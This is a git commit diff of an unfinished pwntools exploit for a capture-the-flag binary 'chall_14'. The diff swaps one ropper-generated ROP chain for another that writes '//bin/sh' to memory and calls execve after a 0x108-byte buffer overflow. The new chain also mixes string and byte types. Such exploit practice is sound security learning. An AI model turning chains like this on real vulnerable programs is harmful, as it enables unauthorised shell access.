28f35e342fabac2975829ee5684d9ce21ea44878
ajarmusch <61516473+ajarmusch@users.noreply.github.com>
2022-05-18 12:57:24 -0400

    # NOT FINISHED

--- chall_14/14.py
+++ chall_14/14.py
@@ -1,41 +1,45 @@
 from pwn import *
+from struct import pack
 
 binary = context.binary = ELF('./chall_14')
 context.log_level = 'INFO'
 
-p = process('./chall_14')
+p = process(binary.path)
 
-#ropper --file chall_14 --chain "execve cmd=/bin/sh" --badbytes 0a
-IMAGE_BASE_0 = binary.address
-rebase_0 = lambda x : p64(x + IMAGE_BASE_0)
-rop  = b''
-rop += rebase_0(0x000000000000da7b) # 0x000000000040da7b: pop r13; ret;
-rop += b'//bin/sh'
-rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;
-rop += rebase_0(0x00000000002b90e0)
-rop += rebase_0(0x0000000000068a29) # 0x0000000000468a29: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
-rop += p64(0xdeadbeefdeadbeef)
-rop += p64(0xdeadbeefdeadbeef)
-rop += p64(0xdeadbeefdeadbeef)
-rop += p64(0xdeadbeefdeadbeef)
-rop += rebase_0(0x000000000000da7b) # 0x000000000040da7b: pop r13; ret;
-rop += p64(0x0000000000000000)
-rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;
-rop += rebase_0(0x00000000002b90e8)
-rop += rebase_0(0x0000000000068a29) # 0x0000000000468a29: mov qword ptr [rdi], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
-rop += p64(0xdeadbeefdeadbeef)
-rop += p64(0xdeadbeefdeadbeef)
-rop += p64(0xdeadbeefdeadbeef)
-rop += p64(0xdeadbeefdeadbeef)
-rop += rebase_0(0x0000000000000696) # 0x0000000000400696: pop rdi; ret;
-rop += rebase_0(0x00000000002b90e0)
-rop += rebase_0(0x0000000000010263) # 0x0000000000410263: pop rsi; ret;
-rop += rebase_0(0x00000000002b90e8)
-rop += rebase_0(0x000000000004c086) # 0x000000000044c086: pop rdx; ret;
-rop += rebase_0(0x00000000002b90e8)
-rop += rebase_0(0x00000000000158f4) # 0x00000000004158f4: pop rax; ret;
-rop += p64(0x000000000000003b)
-rop += rebase_0(0x0000000000074e35) # 0x0000000000474e35: syscall; ret;
+q = lambda x : pack('Q', x)
+
+IMAGE_BASE_0 = 0x0000000000400000 # ed9d47356b7a87594e2a1418fcb428c827570eb42aaf9e93aaffa15ede38193d
+rebase_0 = lambda x : q(x + IMAGE_BASE_0)
+
+rop = ''
+
+rop += rebase_0(0x00000000000118f8) # 0x00000000004118f8: pop r13; ret;
+rop += '//bin/sh'
+rop += rebase_0(0x0000000000001f9b) # 0x0000000000401f9b: pop rbx; ret;
+rop += rebase_0(0x00000000000c00e0)
+rop += rebase_0(0x0000000000084395) # 0x0000000000484395: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
+rop += q(0xdeadbeefdeadbeef)
+rop += q(0xdeadbeefdeadbeef)
+rop += q(0xdeadbeefdeadbeef)
+rop += q(0xdeadbeefdeadbeef)
+rop += rebase_0(0x00000000000118f8) # 0x00000000004118f8: pop r13; ret;
+rop += q(0x0000000000000000)
+rop += rebase_0(0x0000000000001f9b) # 0x0000000000401f9b: pop rbx; ret;
+rop += rebase_0(0x00000000000c00e8)
+rop += rebase_0(0x0000000000084395) # 0x0000000000484395: mov qword ptr [rbx], r13; pop rbx; pop rbp; pop r12; pop r13; ret;
+rop += q(0xdeadbeefdeadbeef)
+rop += q(0xdeadbeefdeadbeef)
+rop += q(0xdeadbeefdeadbeef)
+rop += q(0xdeadbeefdeadbeef)
+rop += rebase_0(0x00000000000018ca) # 0x00000000004018ca: pop rdi; ret;
+rop += rebase_0(0x00000000000c00e0)
+rop += rebase_0(0x000000000000f3fe) # 0x000000000040f3fe: pop rsi; ret;
+rop += rebase_0(0x00000000000c00e8)
+rop += rebase_0(0x00000000000017cf) # 0x00000000004017cf: pop rdx; ret;
+rop += rebase_0(0x00000000000c00e8)
+rop += rebase_0(0x00000000000494a7) # 0x00000000004494a7: pop rax; ret;
+rop += q(0x000000000000003b)
+rop += rebase_0(0x00000000000170a4) # 0x00000000004170a4: syscall; ret;
 
 payload  = 0x108 * b'A'
 payload += rop
